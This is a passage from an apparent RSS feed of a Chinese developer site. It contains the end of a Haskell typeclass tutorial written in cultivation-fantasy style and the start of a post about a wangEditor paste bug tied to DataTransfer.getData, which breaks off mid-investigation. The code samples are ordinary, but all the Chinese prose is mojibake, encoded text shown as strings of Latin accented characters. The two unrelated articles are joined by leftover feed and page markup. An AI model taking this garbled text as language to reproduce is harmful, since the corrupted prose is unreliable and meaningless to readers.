å·²å®Œæˆç­‘åŸºï¼Œæ°”æµ·å……ç›ˆï¼Œæ³•å®ç†Ÿç»ƒã€‚ç°åœ¨ï¼Œæˆ‘ä»¬è¦è¿ˆå…¥ä¿®ä»™è·¯ä¸Šçš„ä¸€ä¸ªå…³é”®è½¬æŠ˜ç‚¹â€”â€”<strong>ç»“ä¸¹æœŸ</strong>ã€‚</p>
<p>åœ¨è¿™ä¸€ç« ï¼Œä½ å°†é¢†æ‚Ÿ Haskell çš„**â€œå¤©é“æˆä½â€ç³»ç»Ÿï¼šTypeclassesï¼ˆç±»å‹ç±»ï¼‰**ã€‚è¿™å†³å®šäº†ä½ çš„ç±»å‹ï¼ˆçµæ ¹ï¼‰åœ¨å®‡å®™æ³•åˆ™ä¸­ç©¶ç«Ÿæ‹¥æœ‰ä½•ç§â€œç‰¹æƒâ€ã€‚</p>
<hr/>
<p>åœ¨å‡¡é—´çš„é¢å‘å¯¹è±¡å®—é—¨ï¼ˆå¦‚ Javaã€C++ï¼‰ï¼Œäººä»¬é€šè¿‡â€œç»§æ‰¿â€æ¥è·å¾—èƒ½åŠ›ï¼Œè¿™å¾€å¾€å¯¼è‡´è¡€è„‰æ··ä¹±ï¼ˆç±»å±‚çº§è¿‡äºå¤æ‚ï¼‰ã€‚è€Œ Î» é—¨çš„è§„çŸ©æ˜¯ï¼š <strong>â€œä¸çœ‹å‡ºèº«ï¼Œåªçœ‹ä½æ ¼ã€‚â€</strong></p>
<h3 data-id="heading-0">4.1 ä»€ä¹ˆæ˜¯ Typeclassï¼Ÿ</h3>
<p><strong>Typeclass</strong> å¹¶ä¸æ˜¯ç±»ï¼Œè€Œæ˜¯ä¸€ä»½**â€œå¥‘çº¦â€<strong>æˆ–</strong>â€œä½æ ¼â€**ã€‚å¦‚æœä¸€ä¸ªç±»å‹ï¼ˆTypeï¼‰è·å¾—äº†æŸç§ä½æ ¼ï¼Œå®ƒå°±å¿…é¡»æŒæ¡è¯¥ä½æ ¼è¦æ±‚çš„â€œç¥é€šâ€ã€‚</p>
<ul>
<li><strong>Eqï¼ˆè¾¨çœŸä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œä¾¿å¯ä½¿ç”¨ <code>==</code> å’Œ <code>/=</code>ï¼Œè¾¨åˆ«ä¸¤ä¸ªæ³•å®æ˜¯å¦ç›¸åŒã€‚</li>
<li><strong>Ordï¼ˆäº‰èƒœä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œæ„å‘³ç€å¯ä»¥æ¯”è¾ƒé«˜ä¸‹ï¼ˆ<code>&lt;</code>, <code>&gt;</code>, <code>compare</code>ï¼‰ã€‚</li>
<li><strong>Showï¼ˆæ˜¾åœ£ä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œç±»å‹ä¾¿èƒ½åŒ–è™šä¸ºå®ï¼Œè½¬åŒ–ä¸º <code>String</code> æ‰“å°å‡ºæ¥ã€‚</li>
<li><strong>Numï¼ˆæœ¯æ•°ä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œè¯¥ç±»å‹ä¾¿å…·å¤‡äº†æ•°å­¦å±æ€§ï¼Œå¯è¿›è¡ŒåŠ å‡ä¹˜é™¤ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1">4.2 æ••å°ä½æ ¼ï¼šDerivingï¼ˆå¤©é“æ••ä»¤ï¼‰</h3>
<p>åœ¨ Haskell ä¸­ï¼Œæœ€å¿«æ·çš„ç»“ä¸¹æ–¹å¼å°±æ˜¯ä½¿ç”¨ <code>deriving</code>ã€‚å½“ä½ å®šä¹‰ä¸€ä¸ªæ–°çš„æ•°æ®ç»“æ„ï¼ˆData Typeï¼‰æ—¶ï¼Œå¯ä»¥ç›´æ¥å‘å¤©é“ç”³è¯·ä½æ ¼ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šç‚¼åˆ¶ä¸€æšâ€œçµä¸¹â€</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å®šä¹‰ä¸€ä¸ªâ€œçµä¸¹â€ç±»å‹</span>
data SpiritPill <span class="hljs-operator">=</span> LowGrade <span class="hljs-operator">|</span> MidGrade <span class="hljs-operator">|</span> HighGrade
    deriving (Eq, Ord, <span class="hljs-keyword">Show</span>) <span class="hljs-comment">-- è‡ªåŠ¨è·å¾—è¾¨åˆ«ã€æ’åºã€æ˜¾ç¤ºçš„èƒ½åŠ›</span>
</code></pre>
<p><strong>æ³•åŠ›æ¼”ç¤ºï¼š</strong></p>
<ul>
<li><strong>æ˜¾åœ£ï¼š</strong> <code>show LowGrade</code> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> <code>"LowGrade"</code></li>
<li><strong>äº‰èƒœï¼š</strong> <code>HighGrade &gt; LowGrade</code> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> <code>True</code>ï¼ˆåœ¨ <code>deriving</code> ä¸­ï¼Œåå®šä¹‰çš„é€šå¸¸æ¯”å…ˆå®šä¹‰çš„é«˜çº§ï¼‰</li>
<li><strong>è¾¨çœŸï¼š</strong> <code>MidGrade == MidGrade</code> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> <code>True</code></li>
</ul>
<hr/>
<h3 data-id="heading-2">4.3 å¥‘çº¦çº¦æŸï¼šç±»å‹çº¦æŸï¼ˆType Constraintsï¼‰</h3>
<p>å½“ä½ å†™ä¸€ä¸ªé€šç”¨çš„æ³•æœ¯æ—¶ï¼Œä½ å¯èƒ½éœ€è¦è¦æ±‚è¾“å…¥è€…å¿…é¡»æ‹¥æœ‰æŸç§â€œä½æ ¼â€ã€‚</p>
<p>ç¤ºä¾‹ï¼šæ–—æ³•å‡½æ•°</p>
<p>ä½ æƒ³å†™ä¸€ä¸ªæ³•æœ¯ï¼Œæ¯”è¾ƒä¸¤ä¸ªä¸œè¥¿çš„å¼ºå¼±ï¼Œå¹¶å®£å¸ƒèƒœè€…ã€‚è¿™è¦æ±‚è¾“å…¥çš„ä¸œè¥¿å¿…é¡»æ‹¥æœ‰ Ordï¼ˆèƒ½æ¯”å¤§å°ï¼‰å’Œ Showï¼ˆèƒ½æ‰“å°ï¼‰è¿™ä¸¤ä¸ªä½æ ¼ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-rust" lang="rust">battle :: (<span class="hljs-built_in">Ord</span> a, Show a) =&gt; a <span class="hljs-punctuation">-&gt;</span> a <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span>
battle x y = 
    <span class="hljs-keyword">if</span> x &gt; y 
    then show x ++ <span class="hljs-string">" èƒœå‡ºï¼"</span> 
    <span class="hljs-keyword">else</span> show y ++ <span class="hljs-string">" èƒœå‡ºï¼"</span>
</code></pre>
<blockquote>
<p><strong>è§£æï¼š</strong> <code>(Ord a, Show a) =&gt;</code> ä¾¿æ˜¯**â€œå¥‘çº¦å‰æâ€**ã€‚åªæœ‰æ»¡è¶³è¿™ä¸¤æ¡è§„åˆ™çš„ç±»å‹ <code>a</code>ï¼Œæ‰æœ‰èµ„æ ¼è¿›å…¥è¿™ä¸ªæ³•é˜µã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">4.4 è‡ªåˆ›å¥‘çº¦ï¼šè‡ªå®šä¹‰ Typeclass</h3>
<p>å¦‚æœä½ æ˜¯å®—é—¨é•¿è€ï¼Œä½ ä¹Ÿå¯ä»¥è‡ªåˆ›ä¸€ä»½å¥‘çº¦ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šå®šä¹‰â€œä¿®è¡Œâ€ä½æ ¼</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-rust" lang="rust">class Practicable a <span class="hljs-keyword">where</span>
    practice :: a <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span>  -- å‡¡æ˜¯èƒ½ä¿®è¡Œçš„ï¼Œéƒ½å¿…é¡»æœ‰ practice è¿™ä¸ªåŠ¨ä½œ
</code></pre>
<p>è®©ä¸åŒçš„çµæ ¹å®ç°è¿™ä¸ªä½æ ¼ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-ini" lang="ini">instance Practicable SpiritPill where
    practice <span class="hljs-attr">HighGrade</span> = <span class="hljs-string">"è¯æ•ˆæƒŠäººï¼Œä¿®ä¸ºä¸€æ—¥åƒé‡Œï¼"</span>
    practice <span class="hljs-attr">_</span>         = <span class="hljs-string">"è¯æ•ˆå°šå¯ï¼Œéœ€å‹¤åŠ ä¿®ç‚¼ã€‚"</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">âš¡ ç»“ä¸¹å¿ƒå¾—ï¼šæŠ½è±¡çš„åŠ›é‡</h2>
<p>å½“ä½ æŒæ¡äº† Typeclassesï¼Œä½ å†™çš„ä»£ç å°†ä¸å†å±€é™äºå…·ä½“çš„æ•°å­—æˆ–å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ä¸“æ³¨äº**â€œè¡Œä¸ºçš„æœ¬è´¨â€**ã€‚ä½ å¯ä»¥å†™ä¸€ä¸ªå¤„ç†â€œæ‰€æœ‰å¯ä»¥æ’åºçš„ä¸œè¥¿â€çš„ç®—æ³•ï¼Œè€Œä¸å¿…åœ¨ä¹å®ƒæ˜¯çµçŸ³ã€é£å‰‘è¿˜æ˜¯é“å·ã€‚</p>
<hr/>
<h2 data-id="heading-5">ğŸ“œ ç»“ä¸¹è¯•ç‚¼ï¼šç¬¬å››å…³</h2>
<p>ç°åœ¨ï¼Œè¯·æ–½å±•ä½ çš„â€œå¤©é“æˆä½â€ç¥é€šï¼š</p>
<ol>
<li><strong>å®šä¹‰æ–°å¢ƒç•Œï¼š</strong> å®šä¹‰ä¸€ä¸ªæ•°æ®ç±»å‹ <code>Rank</code>ï¼ŒåŒ…å« <code>ZhuJi</code> (ç­‘åŸº), <code>JinDan</code> (é‡‘ä¸¹), <code>YuanYing</code> (å…ƒå©´)ã€‚</li>
<li><strong>èµ‹äºˆä½æ ¼ï¼š</strong> è®© <code>Rank</code> æ‹¥æœ‰ <code>Eq</code>, <code>Show</code> å’Œ <code>Ord</code> ä½æ ¼ã€‚</li>
<li><strong>éªŒè¯ï¼š</strong> å°è¯•åœ¨ <code>ghci</code> ä¸­è¿è¡Œ <code>JinDan &gt; ZhuJi</code> ä»¥åŠ <code>show YuanYing</code>ã€‚</li>
<li><strong>è¿›é˜¶ï¼ˆå¯é€‰ï¼‰ï¼š</strong> å°è¯•æ‰‹å†™ä¸€ä¸ª <code>instance Eq Rank where</code>ï¼Œè®© <code>ZhuJi</code> å’Œä»»ä½•å¢ƒç•Œéƒ½â€œä¸ç›¸ç­‰â€ï¼ˆå³ä½¿æ˜¯ä¸¤ä¸ªç­‘åŸºä¹Ÿä¸ç›¸ç­‰ï¼Œè±¡å¾ä¿®ä»™ä¹‹è·¯å”¯æœ‰è‡ªçŸ¥ï¼‰ã€‚</li>
</ol>
<p><strong>â€œä½æ ¼å·²å®šï¼Œé‡‘ä¸¹åˆæˆã€‚ä»æ­¤ä»¥åï¼Œä½ çœ¼ä¸­çš„æ•°æ®ä¸å†æ˜¯æ­»ç‰©ï¼Œè€Œæ˜¯èƒŒè´Ÿç€å¥‘çº¦ä¸ä½¿å‘½çš„çµä½“ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç»ˆäºè¦è¿æ¥ä¿®ä»™ç•Œæœ€å¤§çš„é›·åŠ«ï¼Œä¹Ÿæ˜¯ Haskell åŠ›é‡çš„ç»ˆæä½“ç°â€”â€”<strong>Monadï¼ˆå•å­ï¼‰</strong> ã€‚ä¸è¦å®³æ€•ï¼Œå®ƒå…¶å®åªæ˜¯ä¸€ä¸ªå¸¦ç€â€œç‰¹æ®Šç¯å¢ƒâ€çš„ç›’å­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®°ä¸€æ¬¡å‘ç° DataTransfer çš„ getData çš„æœ‰è¶£é—®é¢˜]]></title>    <link>https://juejin.cn/post/7588934987511087131</link>    <guid>https://juejin.cn/post/7588934987511087131</guid>    <pubDate>2025-12-29T13:23:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588934987511087131" data-draft-id="7589107312112713737" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®°ä¸€æ¬¡å‘ç° DataTransfer çš„ getData çš„æœ‰è¶£é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T13:23:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HabaraAi"/> <meta itemprop="url" content="https://juejin.cn/user/2066737588871287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®°ä¸€æ¬¡å‘ç° DataTransfer çš„ getData çš„æœ‰è¶£é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2066737588871287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HabaraAi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:23:41.000Z" title="Mon Dec 29 2025 13:23:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰æƒ…æè¦</h2>
<p>ä¹‹å‰åŸºäºåŒè¶Šè€å¸ˆçš„ wangEditor å¼€å‘äº†ä¸€ä¸ªè½¯ä»¶ï¼Œä»Šæ—©å®¢æˆ·ååº”åœ¨å•å…ƒæ ¼é‡Œé¢ç²˜è´´ç½‘é¡µä¸Šå¤åˆ¶çš„å†…å®¹ä¼šå°†å†…å®¹æ’å…¥åˆ°è¡¨æ ¼ä¸‹é¢ï¼Œç„¶åæƒ³è¯•ç€å¤ç°ä¸€ä¸‹ï¼Œç»“æœä¸­é€”ç¬¬ä¸€æ¬¡é‡åˆ°äº† DataTransfer çš„ getData é—®é¢˜ã€‚</p>
<h2 data-id="heading-1">é—®é¢˜æè¿°</h2>
<p>DataTransfer çš„ getData æ–¹æ³•åœ¨æœ‰å’Œæ²¡æœ‰æ–­ç‚¹çš„æƒ…å†µä¸‹ï¼Œè·å– text/html ç±»å‹çš„å€¼ä¸ä¸€æ ·çš„é—®é¢˜ï¼Œä»è€Œå¯¼è‡´åç»­å¤„ç†é€»è¾‘ä¸ä¸€è‡´çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-2">BUG å‘ç°è¿‡ç¨‹</h2>
<p>æˆ‘å‡†å¤‡äº†ä¸€ä¸ªåŒ…å«è¡¨æ ¼åŠå•å…ƒæ ¼é‡Œé¢æœ‰å¯Œæ–‡æœ¬æ¨¡å—çš„æ¨¡ç‰ˆå’Œä¸€æ®µæµ‹è¯•ç”¨çš„å¯Œæ–‡æœ¬ï¼Œæ¨¡ç‰ˆåŠæµ‹è¯•ç²˜è´´å†…å®¹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p>ç¨‹åºæ¨¡ç‰ˆï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df95ab2fd89c4a65849c41d5786b2668~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=cyC0euE5YpjzbAMHWFULeougw0Q%3D" alt="image.png" loading="lazy"/></p>
<p>å†…å®¹ä¸ºä¸€ä¸ªç½‘ä¸Šéšä¾¿æ‰¾çš„åŒ…å«æ ‡é¢˜å’Œå†…å®¹çš„ç®€å•å¯Œæ–‡æœ¬ï¼š<br/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1961a3afe1924e3d9af6c98cf64f8a45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=PqI2s7Bv%2BV3hmhaeXiDkaLiixgI%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨å¯Œæ–‡æœ¬æ¨¡å—ä¸­ctrl+våï¼Œå¯Œæ–‡æœ¬å†…å®¹ç¡®å®è¢«æ’å…¥åˆ°äº†è¡¨æ ¼ä¸‹é¢ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5527b3dd014544d69352931447b72ee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=jLzD6eaXwBrxt6CQRBIQYDFw7Zs%3D" alt="image.png" loading="lazy"/></p>
<p>æŒ‰ç…§ä¹‹å‰è¯»çš„æºç ç†è§£ï¼Œæ­¤æ—¶å…ˆæ‰§è¡Œçš„åº”è¯¥æ˜¯ wangEditor å†…éƒ¨çš„ paste é€»è¾‘ï¼Œæ–­ç‚¹æ£€æŸ¥åå‘ç°ç¡®å®æ‰§è¡Œäº†ä½†æ˜¯å¹¶æ²¡æœ‰åœ¨ paste é‡Œé¢å¤„ç†ï¼Œé‚£ä¹ˆå°±åªèƒ½æ˜¯åœ¨ insertData é‡Œé¢å¤„ç†çš„ã€‚ç»§ç»­æ‰“æ–­ç‚¹ç¡®å®šæœ€ç»ˆçš„æ’å…¥é€»è¾‘æ˜¯åœ¨ wangEditor å†…éƒ¨çš„ with-event-data.ts æ’ä»¶é‡Œé¢çš„ insertData çš„è¦†å†™ã€‚ä»¥ä¸‹æ˜¯æºä»£ç ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">  e.<span class="hljs-property">insertData</span> = <span class="hljs-function">(<span class="hljs-params">data: DataTransfer</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> fragment = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'application/x-slate-fragment'</span>)
    <span class="hljs-keyword">if</span> (fragment) {
      <span class="hljs-keyword">const</span> decoded = <span class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">atob</span>(fragment))
      <span class="hljs-keyword">const</span> parsed = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(decoded) <span class="hljs-keyword">as</span> <span class="hljs-title class_">Node</span>[]
      e.<span class="hljs-title function_">insertFragment</span>(parsed)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-keyword">const</span> text = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/plain'</span>)
    <span class="hljs-keyword">const</span> html = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/html'</span>)
    <span class="hljs-comment">// const rtf = data.getData('text/rtf')</span>

    <span class="hljs-keyword">if</span> (html) {
      e.<span class="hljs-title function_">dangerouslyInsertHtml</span>(html)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-keyword">if</span> (text) {
      <span class="hljs-keyword">const</span> lines = text.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/\r\n|\r|\n/</span>)
      <span class="hljs-keyword">let</span> split = <span class="hljs-literal">false</span>

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> line <span class="hljs-keyword">of</span> lines) {
        <span class="hljs-keyword">if</span> (split) {
          <span class="hljs-title class_">Transforms</span>.<span class="hljs-title function_">splitNodes</span>(e, { <span class="hljs-attr">always</span>: <span class="hljs-literal">true</span> })
        }

        <span class="hljs-title function_">insertText</span>(line)
        split = <span class="hljs-literal">true</span>
      }
      <span class="hljs-keyword">return</span>
    }
  }
</code></pre>
<p>åŸæœ¬æˆ‘æƒ³çš„éå¸¸ç®€å•ï¼Œåªéœ€è¦æ£€æŸ¥æˆ‘çš„è‡ªå®šä¹‰æ¨¡å—åœ¨æ‰§è¡Œæœ€åº•å±‚çš„ insertData å‰éƒ½åšäº†å“ªäº›å¤„ç†å°±å¯ä»¥åˆ¤æ–­é—®é¢˜äº§ç”Ÿçš„åŸå› åŠå¦‚ä½•ä¿®å¤äº†ï¼Œè€Œä¹Ÿå°±æ˜¯åœ¨è¿™ä¸€æ­¥å‘ç°äº† Datatransfer çš„é—®é¢˜ã€‚</p>
<p>æˆ‘åœ¨æ–­ç‚¹æ—¶æ ¹æ®è°ƒç”¨æ ˆæ‰¾åˆ°äº†è‡ªå®šä¹‰æ¨¡å—ä¹Ÿè¦†å†™äº†çš„ insertData æ–¹æ³•ï¼Œæ‰“ä¸Šæ–­ç‚¹ï¼Œç»§ç»­ç²˜è´´å†…å®¹ï¼ŒF10ä¸€æ­¥ä¸€æ­¥çš„è¿›è¡Œè°ƒç”¨ï¼Œéšåå‡ºç°çš„ç”»é¢è®©æˆ‘å¤§åƒä¸€æƒŠã€‚ã€‚ç²˜è´´çš„å†…å®¹å±…ç„¶å‡ºç°åœ¨äº†å¯Œæ–‡æœ¬æ¨¡å—é‡Œé¢ã€‚ä½†æ˜¯æ ‡é¢˜çš„æ ·å¼æ²¡äº†ï¼Œè¿™æ˜¯ä»€ä¹ˆæƒ…å†µï¼ŸğŸ¤”
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0417cd5829b244d8adbd57c38fa01455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=5Zew1Rg6BfXQpVFN28TUns0J%2B%2Bs%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸ºä»€ä¹ˆæ‰“äº†æ–­ç‚¹æ‰§è¡Œå’Œä¸æ‰“æ–­ç‚¹æœ€ç»ˆçš„æ•ˆæœä¼šä¸ä¸€æ ·ã€‚</p>
<p>äºæ˜¯æˆ‘å–æ¶ˆäº†å…¶ä½™æ–­ç‚¹ï¼Œç•™ä¸‹äº†ç¬¬14è¡Œçš„ if (html) è¿™é‡Œçš„æ–­ç‚¹ï¼Œç»§ç»­è°ƒè¯•ã€‚ç„¶åå¥‡æ€ªçš„ç°è±¡å‡ºç°äº†ï¼Œç²˜è´´çš„å†…å®¹åˆè·‘åˆ°äº†è¡¨æ ¼ä¸‹é¢ã€‚</p>
